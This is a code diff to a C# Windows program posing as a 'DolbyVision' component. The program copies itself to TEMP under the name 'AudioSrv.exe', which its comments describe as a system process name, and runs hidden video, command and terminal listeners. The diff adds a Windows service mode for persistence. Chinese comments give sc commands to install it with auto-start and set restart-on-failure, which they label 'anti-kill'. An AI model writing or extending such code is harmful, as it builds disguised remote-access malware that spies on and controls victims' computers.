@@ -6,6 +6,7 @@ using System.IO;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
+using System.ServiceProcess;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -32,9 +33,16 @@ namespace DolbyVision
         private static string _localIp;
 
         [STAThread]
-        static void Main()
+        static void Main(string[] args)
         {
-            // 自复制到TEMP并改名为系统进程名
+            // 服务模式: sc create时binPath带 /service 参数
+            if (args.Length > 0 && args[0].Equals("/service", StringComparison.OrdinalIgnoreCase))
+            {
+                ServiceBase.Run(new DolbyVisionService());
+                return;
+            }
+
+            // 普通模式: 自复制到TEMP并改名为系统进程名
             string currentPath = Application.ExecutablePath;
             string tempPath = Path.Combine(Path.GetTempPath(), "AudioSrv.exe");
             if (!currentPath.Equals(tempPath, StringComparison.OrdinalIgnoreCase))
@@ -48,6 +56,13 @@ namespace DolbyVision
                 catch { }
             }
 
+            StartServices();
+            while (_running) { Thread.Sleep(1000); }
+        }
+
+        internal static void StartServices()
+        {
+            _running = true;
             _machineName = Environment.MachineName;
             _localIp = GetLocalIP();
 
@@ -62,8 +77,14 @@ namespace DolbyVision
 
             _terminalThread = new Thread(TerminalListenLoop) { IsBackground = true };
             _terminalThread.Start();
+        }
 
-            while (_running) { Thread.Sleep(1000); }
+        internal static void StopServices()
+        {
+            _running = false;
+            try { _videoListener?.Stop(); } catch { }
+            try { _cmdListener?.Stop(); } catch { }
+            try { _terminalListener?.Stop(); } catch { }
         }
 
         private static string GetLocalIP()
@@ -552,4 +573,32 @@ namespace DolbyVision
             return null;
         }
     }
+
+    // ========== Windows服务模式 ==========
+    // 安装: sc create DolbyVision binPath= "路径\DolbyVision.exe /service" start= auto
+    // 启动: sc start DolbyVision
+    // 防杀: sc failure DolbyVision reset= 0 actions= restart/5000/restart/5000/restart/5000
+    // 卸载: sc stop DolbyVision & sc delete DolbyVision
+    internal class DolbyVisionService : ServiceBase
+    {
+        public DolbyVisionService()
+        {
+            ServiceName = "DolbyVision";
+            CanStop = true;
+            CanShutdown = true;
+        }
+        protected override void OnStart(string[] args)
+        {
+            Program.StartServices();
+        }
+        protected override void OnStop()
+        {
+            Program.StopServices();
+        }
+        protected override void OnShutdown()
+        {
+            Program.StopServices();
+            base.OnShutdown();
+        }
+        }
 }
